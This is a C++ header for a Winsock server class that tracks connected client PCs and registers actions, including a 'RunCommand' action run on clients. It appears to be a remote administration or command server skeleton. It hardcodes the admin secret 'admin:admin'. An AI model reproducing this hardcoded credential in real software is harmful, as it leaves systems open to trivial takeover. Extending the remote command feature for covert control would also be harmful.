#pragma once
#include <iostream>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <Actions/ActionStructures.h>
#include <RequestBuilder/RequestBuilder.h>

#include "Actions/Action.h"

#pragma comment(lib, "Ws2_32.lib")

class Server
{
public:
    Server();
    ~Server();

    WSADATA wsaData{};
    SOCKET serverSocket{}, clientSocket{};
    sockaddr_in serverAddr{}, clientAddr{};
    int PORT = 54000;
    bool isRunning = false;

    std::string admin_secret = "admin:admin";

    void StartServer();
    void EndServer();
    void HandleClient(SOCKET clientSocket);
    void UpdateClientStatus(SOCKET clientSocket);
    void AdminThread(Server* server);

    void RegisterActions();

    ActionFactory actionFactory;

protected:
    std::map<SOCKET,std::vector<std::thread>> clientThreads;
    std::thread adminThread;
    std::mutex clientThreadsMutex;

    std::map<SOCKET,PCStatus_S_OUT> clientStatuses;

    std::vector<std::shared_ptr<Action>> debug_actions;
    std::vector<std::shared_ptr<Action>> client_actions;
};

inline void Server::RegisterActions()
{
    // !TODO: Register all DEBUG actions here
    debug_actions.push_back(std::make_shared<GetClientStatus>());

    // !TODO: Register all CLIENT actions here
    client_actions.push_back(std::make_shared<RunCommand>());
    client_actions.push_back(std::make_shared<GetClientStatus>());
}
